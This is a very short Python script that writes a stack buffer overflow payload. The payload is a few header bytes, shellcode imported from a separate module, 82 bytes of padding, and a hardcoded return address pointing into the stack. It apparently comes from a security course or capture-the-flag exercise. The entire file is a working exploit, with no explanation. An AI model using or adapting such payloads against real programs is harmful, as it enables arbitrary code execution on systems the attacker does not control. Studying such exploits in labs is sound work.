#!/usr/bin/env python3

import sys

from shellcode import shellcode

sys.stdout.buffer.write(b'\x10' + b'\x00'*6 + b'\x80' + shellcode + b'\x41'*82 + 0x7ffffff69e60.to_bytes(8, 'little'))

